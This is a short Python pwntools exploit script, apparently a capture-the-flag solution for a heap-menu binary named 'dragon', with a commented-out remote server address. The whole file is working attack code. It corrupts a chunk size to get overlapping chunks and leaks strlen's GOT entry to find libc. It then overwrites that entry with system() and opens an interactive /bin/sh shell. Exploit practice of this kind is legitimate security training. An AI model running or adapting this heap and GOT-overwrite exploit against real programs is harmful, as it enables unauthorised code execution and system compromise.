from pwn import *

#r = remote('58.213.63.30', 11501) 
r = process("./dragon")

def add(size, name, content):
r.recvuntil('>>')
r.sendline('1')
r.recvuntil(':')
r.sendline(str(size))
r.recvuntil(':')
r.sendline(name)
r.recvuntil(':')
r.sendline(content)

def edit(id, content):
r.recvuntil('>>')
r.sendline('2')
r.recvuntil(':')
r.sendline(str(id))
r.recvuntil(':')
r.write(content)

def show(id):
r.recvuntil('>>')
r.sendline('4')
r.recvuntil(':')
r.sendline(str(id))

def delete(id):
r.recvuntil('>>')
r.sendline('3')
r.recvuntil(':')
r.sendline(str(id))


add(0x20, 'AAAA', 'AAAA')
add(0x20, 'AAAA', 'A'*0x18)
add(0x20, 'AAAA', 'A'*0x18)

edit(0, 'A'*0x18+p64(0xd1)) # note1
delete(1)
add(0x20, 'AAAA', 'A'*0x18)
strlen_got = 0x602028
add(0x10, 'AAAA', p64(strlen_got)+'d'*0x10)
edit(3, p64(strlen_got)) #note2
show(2)
r.recvuntil('content: ')
strlen_addr = u64(r.readline()[:-1].ljust(8, '\x00'))
print "[*] strlen addr:{0}".format(hex(strlen_addr))
libc = ELF("./libc-2.19.so")#ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc_base = strlen_addr - libc.symbols['strlen']
system_addr = libc_base + libc.symbols['system'] 
edit(2, p64(system_addr))

edit(0, '/bin/sh\x00')
r.interactive()